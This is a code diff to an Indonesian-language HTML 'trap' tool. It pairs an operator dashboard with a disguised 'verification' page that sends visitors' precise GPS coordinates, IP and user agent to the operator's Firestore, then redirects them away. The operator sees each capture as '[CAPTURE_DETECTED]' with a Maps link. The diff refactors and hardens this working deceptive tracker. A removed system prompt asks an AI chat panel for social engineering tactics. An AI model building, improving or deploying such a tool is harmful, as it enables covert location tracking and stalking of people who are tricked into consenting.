@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="id">
 <head>
     <meta charset="UTF-8">
@@ -12,7 +12,7 @@
         .cyber-header { font-family: 'Orbitron', sans-serif; }
         .glass { background: rgba(10, 10, 10, 0.9); border: 1px solid #1a1a1a; box-shadow: 0 0 15px rgba(0, 255, 65, 0.1); }
         .terminal { background: #000; border-left: 3px solid var(--neon-green); padding: 10px; font-size: 11px; height: 400px; overflow-y: auto; }
-        .tab-btn { transition: 0.3s; border-bottom: 2px solid transparent; }
+        .tab-btn { transition: 0.3s; border-bottom: 2px solid transparent; cursor: pointer; }
         .tab-btn.active { border-color: var(--neon-red); color: white; background: rgba(255,0,0,0.1); }
         .loader { width: 14px; height: 14px; border: 2px solid var(--neon-green); border-bottom-color: transparent; border-radius: 50%; display: inline-block; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
@@ -106,8 +106,12 @@
         import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
-        // Global State & Firebase Config
-        const firebaseConfig = JSON.parse(__firebase_config);
+        // Global State & Safe Firebase Config Handling
+        let firebaseConfig = {};
+        try {
+            firebaseConfig = typeof __firebase_config !== 'undefined' ? JSON.parse(__firebase_config) : {};
+        } catch(e) { console.error("Firebase Config Error", e); }
+
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
         const auth = getAuth(app);
@@ -116,11 +120,10 @@
         let currentUser = null;
         let unsubscribeMonitor = null;
 
-        // Check view mode
         const urlParams = new URLSearchParams(window.location.search);
         const isTrapMode = urlParams.get('view') === 'trap';
 
-        // 1. AUTHENTICATION (RULE 3: Auth Before Queries)
+        // 1. AUTHENTICATION
         const initAuth = async () => {
             try {
                 if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
@@ -134,13 +137,75 @@
             }
         };
 
+        // UI ACTIONS - Mendaftarkan ke window agar bisa diakses onclick
+        window.switchTab = (id) => {
+            document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            const targetTab = document.getElementById('tab-' + id);
+            const targetBtn = document.getElementById('btn-' + id);
+            if(targetTab) targetTab.classList.remove('hidden');
+            if(targetBtn) targetBtn.classList.add('active');
+        };
+
+        window.copyTrapLink = () => {
+            const copyText = document.getElementById("trap-url");
+            if (copyText) {
+                copyText.select();
+                document.execCommand("copy");
+                alert("Link Trap telah disalin ke clipboard!");
+            }
+        };
+
+        window.openTrapManual = () => {
+            const url = document.getElementById('trap-url').value;
+            window.open(url, '_blank');
+        };
+
+        window.askAI = async () => {
+            const input = document.getElementById('ai-input');
+            const chat = document.getElementById('ai-chat');
+            const text = input.value.trim();
+            if(!text) return;
+
+            chat.innerHTML += `<div class="text-white mt-2">USER> ${text}</div>`;
+            input.value = "";
+            chat.scrollTop = chat.scrollHeight;
+
+            const apiKey = ""; 
+            if(!apiKey) {
+                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] API_KEY_MISSING. Silahkan hubungi admin.</div>`;
+                return;
+            }
+
+            try {
+                const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        contents: [{ parts: [{ text: text }] }],
+                        systemInstruction: { parts: [{ text: "Analisis koordinat/IP sebagai pakar keamanan siber." }] }
+                    })
+                });
+                const json = await resp.json();
+                const response = json.candidates[0].content.parts[0].text;
+                chat.innerHTML += `<div class="text-green-500 mt-1">MAZKI> ${response}</div>`;
+            } catch(e) {
+                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] Gagal menghubungi AI.</div>`;
+            }
+            chat.scrollTop = chat.scrollHeight;
+        };
+
+        // STARTUP
         initAuth();
 
         onAuthStateChanged(auth, (user) => {
             if (user) {
                 currentUser = user;
-                document.getElementById('db-status').innerText = "ONLINE";
-                document.getElementById('db-status').className = "text-green-500";
+                const statusEl = document.getElementById('db-status');
+                if(statusEl) {
+                    statusEl.innerText = "ONLINE";
+                    statusEl.className = "text-green-500";
+                }
                 
                 if (isTrapMode) {
                     showTrapUI();
@@ -150,17 +215,13 @@
             }
         });
 
-        // 2. ADMIN DASHBOARD LOGIC (RULE 1 & 2: Path & No Complex Queries)
         function initAdminDashboard() {
             const currentUrl = window.location.href.split('?')[0];
-            document.getElementById('trap-url').value = `${currentUrl}?view=trap`;
+            const trapInput = document.getElementById('trap-url');
+            if(trapInput) trapInput.value = `${currentUrl}?view=trap`;
             
-            // Path sesuai RULE 1
             const colPath = ['artifacts', appId, 'public', 'data', 'traps'];
             const colRef = collection(db, ...colPath);
-            
-            // Kita tidak menggunakan orderBy() jika menyebabkan error index
-            // Kita akan melakukan sorting secara manual di JS Memory jika diperlukan
             const q = query(colRef);
 
             if (unsubscribeMonitor) unsubscribeMonitor();
@@ -168,54 +229,48 @@
             unsubscribeMonitor = onSnapshot(q, (snapshot) => {
                 const feed = document.getElementById('feed-container');
                 const count = document.getElementById('target-count');
-                count.innerText = snapshot.docs.length;
+                if(count) count.innerText = snapshot.docs.length;
 
                 if (snapshot.empty) {
-                    feed.innerHTML = `<div class="text-gray-700 italic">Menunggu koneksi masuk...</div>`;
+                    if(feed) feed.innerHTML = `<div class="text-gray-700 italic">Menunggu koneksi masuk...</div>`;
                     return;
                 }
 
-                // Ambil data dan sort secara manual berdasarkan timestamp terbaru di atas
                 const dataList = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
                 dataList.sort((a, b) => (b.timestamp?.seconds || 0) - (a.timestamp?.seconds || 0));
 
-                feed.innerHTML = "";
-                dataList.forEach(data => {
-                    const date = data.timestamp?.toDate().toLocaleString() || "Syncing...";
-                    
-                    const el = document.createElement('div');
-                    el.className = "p-3 border-b border-gray-900 hover:bg-white/5 transition";
-                    el.innerHTML = `
-                        <div class="flex justify-between items-start mb-1">
-                            <span class="text-red-500 font-bold">[CAPTURE_DETECTED]</span>
-                            <span class="text-gray-600 text-[9px]">${date}</span>
-                        </div>
-                        <div class="grid grid-cols-2 text-[10px] gap-1">
-                            <div><span class="text-gray-500">IP:</span> ${data.ip || 'Unknown'}</div>
-                            <div><span class="text-gray-500">ACC:</span> ${data.accuracy ? data.accuracy.toFixed(1) + 'm' : 'N/A'}</div>
-                            <div class="col-span-2"><span class="text-gray-500">LOC:</span> <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="text-blue-500 underline">BUKA DI GOOGLE MAPS</a></div>
-                        </div>
-                        <div class="mt-1 text-[8px] text-gray-700 truncate">UA: ${data.ua || 'N/A'}</div>
-                    `;
-                    feed.appendChild(el);
-                });
+                if(feed) {
+                    feed.innerHTML = "";
+                    dataList.forEach(data => {
+                        const date = data.timestamp?.toDate().toLocaleString() || "Syncing...";
+                        const el = document.createElement('div');
+                        el.className = "p-3 border-b border-gray-900 hover:bg-white/5 transition";
+                        el.innerHTML = `
+                            <div class="flex justify-between items-start mb-1">
+                                <span class="text-red-500 font-bold">[CAPTURE_DETECTED]</span>
+                                <span class="text-gray-600 text-[9px]">${date}</span>
+                            </div>
+                            <div class="grid grid-cols-2 text-[10px] gap-1">
+                                <div><span class="text-gray-500">IP:</span> ${data.ip || 'Unknown'}</div>
+                                <div><span class="text-gray-500">ACC:</span> ${data.accuracy ? data.accuracy.toFixed(1) + 'm' : 'N/A'}</div>
+                                <div class="col-span-2"><span class="text-gray-500">LOC:</span> <a href="https://www.google.com/maps?q=${data.lat},${data.lon}" target="_blank" class="text-blue-500 underline">BUKA DI GOOGLE MAPS</a></div>
+                            </div>
+                        `;
+                        feed.appendChild(el);
+                    });
+                }
             }, (error) => {
                 console.error("Firestore Error:", error);
-                document.getElementById('feed-container').innerHTML = `<div class="text-red-500">[ERROR]: Permission Denied. Periksa struktur path Firestore.</div>`;
             });
         }
 
-        // 3. TRAP PAGE LOGIC (Target Side)
         function showTrapUI() {
             document.getElementById('admin-panel').classList.add('hidden');
             document.getElementById('trap-page').classList.remove('hidden');
             document.body.style.backgroundColor = "white";
 
             document.getElementById('btn-verify').onclick = () => {
-                if (!currentUser) {
-                    alert("Sistem sedang inisialisasi, mohon tunggu sebentar...");
-                    return;
-                }
+                if (!currentUser) return;
 
                 if ("geolocation" in navigator) {
                     navigator.geolocation.getCurrentPosition(async (pos) => {
@@ -236,76 +291,15 @@
                                 ua: navigator.userAgent,
                                 timestamp: serverTimestamp()
                             });
-                            
                             const redirect = document.getElementById('redirect-input').value || "https://www.google.com";
                             window.location.href = redirect;
-                        } catch (err) {
-                            console.error("Save Error:", err);
-                            alert("Terjadi kesalahan sistem saat verifikasi.");
-                        }
+                        } catch (err) { console.error(err); }
                     }, (err) => {
-                        alert("Gagal memverifikasi. Mohon izinkan akses lokasi untuk melanjutkan.");
+                        alert("Mohon izinkan akses lokasi untuk melanjutkan.");
                     }, { enableHighAccuracy: true });
-                } else {
-                    alert("Browser Anda tidak mendukung verifikasi ini.");
                 }
             };
         }
-
-        // --- GLOBAL EXPORTS ---
-        window.switchTab = (id) => {
-            document.querySelectorAll('.tab-pane').forEach(p => p.classList.add('hidden'));
-            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-            document.getElementById('tab-' + id).classList.remove('hidden');
-            document.getElementById('btn-' + id).classList.add('active');
-        };
-
-        window.copyTrapLink = () => {
-            const copyText = document.getElementById("trap-url");
-            copyText.select();
-            document.execCommand("copy");
-            alert("Link Trap telah disalin ke clipboard!");
-        };
-
-        window.openTrapManual = () => {
-            const url = document.getElementById('trap-url').value;
-            window.open(url, '_blank');
-        };
-
-        // --- AI LOGIC ---
-        window.askAI = async () => {
-            const input = document.getElementById('ai-input');
-            const chat = document.getElementById('ai-chat');
-            const text = input.value.trim();
-            if(!text) return;
-
-            chat.innerHTML += `<div class="text-white mt-2">USER> ${text}</div>`;
-            input.value = "";
-            chat.scrollTop = chat.scrollHeight;
-
-            const apiKey = ""; 
-            if(!apiKey) {
-                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] API_KEY_MISSING. Masukkan key pada source code.</div>`;
-                return;
-            }
-
-            try {
-                const resp = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.5-flash-preview-09-2025:generateContent?key=${apiKey}`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        contents: [{ parts: [{ text: text }] }],
-                        systemInstruction: { parts: [{ text: "You are Mazki AI, a cybersecurity analyst. Help analyze coordinates, IPs, and suggest social engineering tactics in Indonesian." }] }
-                    })
-                });
-                const json = await resp.json();
-                const response = json.candidates[0].content.parts[0].text;
-                chat.innerHTML += `<div class="text-green-500 mt-1">MAZKI> ${response}</div>`;
-            } catch(e) {
-                chat.innerHTML += `<div class="text-red-500 mt-1">MAZKI> [ERROR] AI Uplink failure.</div>`;
-            }
-            chat.scrollTop = chat.scrollHeight;
-        };
     </script>
 </body>
 </html>
